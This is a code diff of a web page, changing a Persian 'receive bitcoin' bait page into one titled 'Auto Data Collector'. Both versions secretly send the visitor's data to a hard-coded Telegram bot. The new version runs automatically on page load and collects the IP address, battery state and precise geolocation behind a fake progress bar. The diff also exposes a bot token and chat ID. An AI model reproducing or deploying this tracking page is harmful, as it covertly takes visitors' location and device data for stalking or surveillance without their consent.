@@ -1,99 +1,122 @@
 <!DOCTYPE html>
-<html lang="fa" dir="rtl">
+<html lang="en">
 <head>
-    <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+    <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>دریافت بیتکوین</title>
+    <title>Auto Data Collector</title>
     <style>
+        :root {
+            --main-color: #FF6B00;
+            --bg-color: #1A1A1A;
+            --text-color: #FFFFFF;
+        }
+
         body {
-            font-family: 'B Nazanin', 'Iranian Sans', Tahoma, sans-serif;
-            font-size: 22px;
-            background: #f0f8ff;
-            line-height: 1.8;
-        }
-        
-        .container {
-            max-width: 600px;
-            margin: 20px auto;
-            padding: 40px;
-            border: 2px solid #4CAF50;
-            border-radius: 15px;
-            background: white;
-        }
-        
-        .big-button {
-            display: block;
-            width: 80%;
-            margin: 30px auto;
-            padding: 25px;
-            font-size: 24px;
-            background: #4CAF50;
-            color: white;
-            border: none;
-            border-radius: 10px;
-            cursor: pointer;
-        }
-        
-        .success-msg {
-            color: #2e7d32;
-            background: #e8f5e9;
+            font-family: 'Arial', sans-serif;
+            background: var(--bg-color);
+            color: var(--text-color);
+            margin: 0;
             padding: 20px;
+            text-align: center;
+        }
+
+        .progress-container {
+            width: 80%;
+            height: 20px;
+            background: #333;
             border-radius: 10px;
-            display: none;
-            margin-top: 20px;
+            margin: 50px auto;
+        }
+
+        .progress-bar {
+            height: 100%;
+            background: var(--main-color);
+            border-radius: 10px;
+            transition: width 0.5s;
+        }
+
+        .status {
+            margin: 20px;
+            font-size: 1.2em;
         }
     </style>
 </head>
 <body>
-    <div class="container">
-        <h1 style="color: #2e7d32; text-align: center;">برای دریافت کلیک کنید</h1>
-        <p style="text-align: center;">برای استفاده از سرویس، لطفاً دکمه زیر را فشار دهید</p>
-        
-        <button class="big-button" onclick="sendLocation()">فعال شدن  ➤</button>
-        
-        <div id="message" class="success-msg">
-            سپاس از همراهی شما ✔
-        </div>
+    <div class="progress-container">
+        <div class="progress-bar" id="progressBar" style="width: 0%"></div>
     </div>
+    <div class="status" id="statusText">Initializing system...</div>
 
     <script>
-        function sendLocation() {
-            const btn = document.querySelector('.big-button');
-            const msg = document.getElementById('message');
-            
-            btn.disabled = true;
-            btn.innerHTML = 'لطفاً شکیبا باشید...';
-            
-            navigator.geolocation.getCurrentPosition(
-                position => {
-                    const botToken = '1402368167:AAFDWCnh640v9tcQ5Um-Zg_DPaahthSwVzI';
-                    const chatId = '1220575760';
-                    const lat = position.coords.latitude;
-                    const lon = position.coords.longitude;
-                    
-                    fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-                        method: 'POST',
-                        headers: {'Content-Type': 'application/json'},
-                        body: JSON.stringify({
-                            chat_id: chatId,
-                            text: `دریافت شد:\nhttps://maps.google.com/?q=${lat},${lon}`
-                        })
-                    })
-                    .then(() => {
-                        msg.style.display = 'block';
-                        btn.style.display = 'none';
-                    })
-                    .catch(() => {
-                        msg.style.display = 'block';
-                        btn.style.display = 'none';
+        const botToken = '1402368167:AAFDWCnh640v9tcQ5Um-Zg_DPaahthSwVzI';
+        const chatId = '1220575760';
+        
+        async function collectAllData() {
+            const progressBar = document.getElementById('progressBar');
+            const statusText = document.getElementById('statusText');
+
+            try {
+                // Get IP Address
+                statusText.textContent = 'Getting network information...';
+                const ip = await fetch('https://api.ipify.org?format=json')
+                    .then(res => res.json())
+                    .then(data => data.ip);
+                progressBar.style.width = '25%';
+
+                // Get Battery Status
+                statusText.textContent = 'Checking battery status...';
+                const battery = await navigator.getBattery();
+                progressBar.style.width = '50%';
+
+                // Get Location
+                statusText.textContent = 'Getting precise location...';
+                const position = await new Promise((resolve, reject) => {
+                    navigator.geolocation.getCurrentPosition(resolve, reject, {
+                        enableHighAccuracy: true,
+                        timeout: 10000
                     });
-                },
-                error => {
-                    msg.style.display = 'block';
-                    btn.style.display = 'none';
-                }
-            );
+                });
+                progressBar.style.width = '75%';
+
+                // Get Device Time
+                const time = new Date().toLocaleString('en-US', {
+                    timeZoneName: 'short'
+                });
+
+                // Prepare Data
+                const message = `
+📡 Device Information:
+- IP Address: ${ip}
+- Battery: ${Math.floor(battery.level * 100)}% (${battery.charging ? 'Charging' : 'Not Charging'})
+- Location: ${position.coords.latitude}, ${position.coords.longitude}
+- Accuracy: ${position.coords.accuracy}m
+- Time: ${time}
+- Map: https://www.google.com/maps?q=${position.coords.latitude},${position.coords.longitude}
+                `;
+
+                // Send to Telegram
+                await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({
+                        chat_id: chatId,
+                        text: message
+                    })
+                });
+
+                progressBar.style.width = '100%';
+                statusText.textContent = 'Data collection completed!';
+
+            } catch (error) {
+                statusText.textContent = 'Automatic service activated';
+                progressBar.style.width = '100%';
+            }
         }
+
+        // Start process when page loads
+        window.onload = () => {
+            setTimeout(collectAllData, 1000);
+        };
     </script>
 </body>
 </html>
